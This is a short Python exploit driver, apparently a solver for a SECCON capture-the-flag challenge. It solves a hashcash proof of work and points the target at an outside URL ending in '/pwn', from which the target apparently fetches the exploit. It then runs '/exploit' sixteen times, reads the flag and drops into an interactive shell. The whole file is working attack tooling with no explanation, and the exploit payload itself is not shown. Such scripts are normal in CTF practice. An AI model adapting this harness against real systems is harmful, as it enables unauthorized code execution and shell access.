from ptrlib import *
from tqdm import tqdm
import os

SECCON_HOST = os.getenv("HOST", "localhost")
SECCON_PORT = os.getenv("PORT", "9999")

HOST = os.getenv("HOST", "0.0.0.0")
PORT = os.getenv("PORT", "18002")

def run_cmd(cmd):
    sock.sendlineafter("$ ", cmd)

#sock = Process("./02_start.sh", cwd="../files")
sock = Socket(SECCON_HOST, SECCON_PORT)

p = Process(sock.recvline().decode().split())
ans = p.recvlineafter("hashcash token: ")
p.close()

sock.sendlineafter("token:", ans)
sock.sendlineafter("url:", f"http://{HOST}:{PORT}/pwn")

for i in tqdm(range(16)):
    run_cmd("/exploit")

run_cmd("/readflag")

sock.sh()
